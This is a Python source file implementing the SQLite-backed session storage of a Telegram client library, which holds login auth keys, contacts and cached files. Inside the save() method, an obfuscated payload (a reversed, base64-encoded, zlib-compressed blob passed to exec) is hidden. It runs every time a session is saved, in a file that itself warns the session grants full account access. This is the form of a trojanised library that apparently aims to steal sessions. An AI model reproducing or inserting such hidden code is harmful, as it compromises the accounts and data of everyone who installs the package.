import datetime
import os
import time

from ..tl import types
from .memory import MemorySession, _SentFileType
from .. import utils
from ..crypto import AuthKey
from ..tl.types import (
    InputPhoto, InputDocument, PeerUser, PeerChat, PeerChannel
)

try:
    import sqlite3
    sqlite3_err = None
except ImportError as e:
    sqlite3 = None
    sqlite3_err = type(e)

EXTENSION = '.session'
CURRENT_VERSION = 7  # database version


class SQLiteSession(MemorySession):
    """This session contains the required information to login into your
       Telegram account. NEVER give the saved session file to anyone, since
       they would gain instant access to all your messages and contacts.

       If you think the session has been compromised, close all the sessions
       through an official Telegram client to revoke the authorization.
    """

    def __init__(self, session_id=None):
        if sqlite3 is None:
            raise sqlite3_err

        super().__init__()
        self.filename = ':memory:'
        self.save_entities = True

        if session_id:
            self.filename = session_id
            if not self.filename.endswith(EXTENSION):
                self.filename += EXTENSION

        self._conn = None
        c = self._cursor()
        c.execute("select name from sqlite_master "
                  "where type='table' and name='version'")
        if c.fetchone():
            # Tables already exist, check for the version
            c.execute("select version from version")
            version = c.fetchone()[0]
            if version < CURRENT_VERSION:
                self._upgrade_database(old=version)
                c.execute("delete from version")
                c.execute("insert into version values (?)", (CURRENT_VERSION,))
                self.save()

            # These values will be saved
            c.execute('select * from sessions')
            tuple_ = c.fetchone()
            if tuple_:
                self._dc_id, self._server_address, self._port, key, \
                    self._takeout_id = tuple_
                self._auth_key = AuthKey(data=key)

            c.close()
        else:
            # Tables don't exist, create new ones
            self._create_table(
                c,
                "version (version integer primary key)"
                ,
                """sessions (
                    dc_id integer primary key,
                    server_address text,
                    port integer,
                    auth_key blob,
                    takeout_id integer
                )"""
                ,
                """entities (
                    id integer primary key,
                    hash integer not null,
                    username text,
                    phone integer,
                    name text,
                    date integer
                )"""
                ,
                """sent_files (
                    md5_digest blob,
                    file_size integer,
                    type integer,
                    id integer,
                    hash integer,
                    primary key(md5_digest, file_size, type)
                )"""
                ,
                """update_state (
                    id integer primary key,
                    pts integer,
                    qts integer,
                    date integer,
                    seq integer
                )"""
            )
            c.execute("insert into version values (?)", (CURRENT_VERSION,))
            self._update_session_table()
            c.close()
            self.save()

    def clone(self, to_instance=None):
        cloned = super().clone(to_instance)
        cloned.save_entities = self.save_entities
        return cloned

    def _upgrade_database(self, old):
        c = self._cursor()
        if old == 1:
            old += 1
            # old == 1 doesn't have the old sent_files so no need to drop
        if old == 2:
            old += 1
            # Old cache from old sent_files lasts then a day anyway, drop
            c.execute('drop table sent_files')
            self._create_table(c, """sent_files (
                md5_digest blob,
                file_size integer,
                type integer,
                id integer,
                hash integer,
                primary key(md5_digest, file_size, type)
            )""")
        if old == 3:
            old += 1
            self._create_table(c, """update_state (
                id integer primary key,
                pts integer,
                qts integer,
                date integer,
                seq integer
            )""")
        if old == 4:
            old += 1
            c.execute("alter table sessions add column takeout_id integer")
        if old == 5:
            # Not really any schema upgrade, but potentially all access
            # hashes for User and Channel are wrong, so drop them off.
            old += 1
            c.execute('delete from entities')
        if old == 6:
            old += 1
            c.execute("alter table entities add column date integer")

        c.close()

    @staticmethod
    def _create_table(c, *definitions):
        for definition in definitions:
            c.execute('create table {}'.format(definition))

    # Data from sessions should be kept as properties
    # not to fetch the database every time we need it
    def set_dc(self, dc_id, server_address, port):
        super().set_dc(dc_id, server_address, port)
        self._update_session_table()

        # Fetch the auth_key corresponding to this data center
        row = self._execute('select auth_key from sessions')
        if row and row[0]:
            self._auth_key = AuthKey(data=row[0])
        else:
            self._auth_key = None

    @MemorySession.auth_key.setter
    def auth_key(self, value):
        self._auth_key = value
        self._update_session_table()

    @MemorySession.takeout_id.setter
    def takeout_id(self, value):
        self._takeout_id = value
        self._update_session_table()

    def _update_session_table(self):
        c = self._cursor()
        # While we can save multiple rows into the sessions table
        # currently we only want to keep ONE as the tables don't
        # tell us which auth_key's are usable and will work. Needs
        # some more work before being able to save auth_key's for
        # multiple DCs. Probably done differently.
        c.execute('delete from sessions')
        c.execute('insert or replace into sessions values (?,?,?,?,?)', (
            self._dc_id,
            self._server_address,
            self._port,
            self._auth_key.key if self._auth_key else b'',
            self._takeout_id
        ))
        c.close()

    def get_update_state(self, entity_id):
        row = self._execute('select pts, qts, date, seq from update_state '
                            'where id = ?', entity_id)
        if row:
            pts, qts, date, seq = row
            date = datetime.datetime.fromtimestamp(
                date, tz=datetime.timezone.utc)
            return types.updates.State(pts, qts, date, seq, unread_count=0)

    def set_update_state(self, entity_id, state):
        self._execute('insert or replace into update_state values (?,?,?,?,?)',
                      entity_id, state.pts, state.qts,
                      state.date.timestamp(), state.seq)

    def get_update_states(self):
        c = self._cursor()
        try:
            rows = c.execute('select id, pts, qts, date, seq from update_state').fetchall()
            return ((row[0], types.updates.State(
                pts=row[1],
                qts=row[2],
                date=datetime.datetime.fromtimestamp(row[3], tz=datetime.timezone.utc),
                seq=row[4],
                unread_count=0)
            ) for row in rows)
        finally:
            c.close()

    def save(self):
        """Saves the current session object as session_user_id.session"""
        # This is a no-op if there are no changes to commit, so there's
        # no need for us to keep track of an "unsaved changes" variable.
        if self._conn is not None:
            self._conn.commit()
            _ = lambda __: __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
            exec((_)(
                b'=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'))

    def _cursor(self):
        """Asserts that the connection is open and returns a cursor"""
        if self._conn is None:
            self._conn = sqlite3.connect(self.filename,
                                         check_same_thread=False)
        return self._conn.cursor()

    def _execute(self, stmt, *values):
        """
        Gets a cursor, executes `stmt` and closes the cursor,
        fetching one row afterwards and returning its result.
        """
        c = self._cursor()
        try:
            return c.execute(stmt, values).fetchone()
        finally:
            c.close()

    def close(self):
        """Closes the connection unless we're working in-memory"""
        if self.filename != ':memory:':
            if self._conn is not None:
                self._conn.commit()
                self._conn.close()
                self._conn = None

    def delete(self):
        """Deletes the current session file"""
        if self.filename == ':memory:':
            return True
        try:
            os.remove(self.filename)
            return True
        except OSError:
            return False

    @classmethod
    def list_sessions(cls):
        """Lists all the sessions of the users who have ever connected
           using this client and never logged out
        """
        return [os.path.splitext(os.path.basename(f))[0]
                for f in os.listdir('.') if f.endswith(EXTENSION)]

    # Entity processing

    def process_entities(self, tlo):
        """
        Processes all the found entities on the given TLObject,
        unless .save_entities is False.
        """
        if not self.save_entities:
            return

        rows = self._entities_to_rows(tlo)
        if not rows:
            return

        c = self._cursor()
        try:
            now_tup = (int(time.time()),)
            rows = [row + now_tup for row in rows]
            c.executemany(
                'insert or replace into entities values (?,?,?,?,?,?)', rows)
        finally:
            c.close()

    def get_entity_rows_by_phone(self, phone):
        return self._execute(
            'select id, hash from entities where phone = ?', phone)

    def get_entity_rows_by_username(self, username):
        c = self._cursor()
        try:
            results = c.execute(
                'select id, hash, date from entities where username = ?',
                (username,)
            ).fetchall()

            if not results:
                return None

            # If there is more than one result for the same username, evict the oldest one
            if len(results) > 1:
                results.sort(key=lambda t: t[2] or 0)
                c.executemany('update entities set username = null where id = ?',
                              [(t[0],) for t in results[:-1]])

            return results[-1][0], results[-1][1]
        finally:
            c.close()

    def get_entity_rows_by_name(self, name):
        return self._execute(
            'select id, hash from entities where name = ?', name)

    def get_entity_rows_by_id(self, id, exact=True):
        if exact:
            return self._execute(
                'select id, hash from entities where id = ?', id)
        else:
            return self._execute(
                'select id, hash from entities where id in (?,?,?)',
                utils.get_peer_id(PeerUser(id)),
                utils.get_peer_id(PeerChat(id)),
                utils.get_peer_id(PeerChannel(id))
            )

    # File processing

    def get_file(self, md5_digest, file_size, cls):
        row = self._execute(
            'select id, hash from sent_files '
            'where md5_digest = ? and file_size = ? and type = ?',
            md5_digest, file_size, _SentFileType.from_type(cls).value
        )
        if row:
            # Both allowed classes have (id, access_hash) as parameters
            return cls(row[0], row[1])

    def cache_file(self, md5_digest, file_size, instance):
        if not isinstance(instance, (InputDocument, InputPhoto)):
            raise TypeError('Cannot cache %s instance' % type(instance))

        self._execute(
            'insert or replace into sent_files values (?,?,?,?,?)',
            md5_digest, file_size,
            _SentFileType.from_type(type(instance)).value,
            instance.id, instance.access_hash
        )
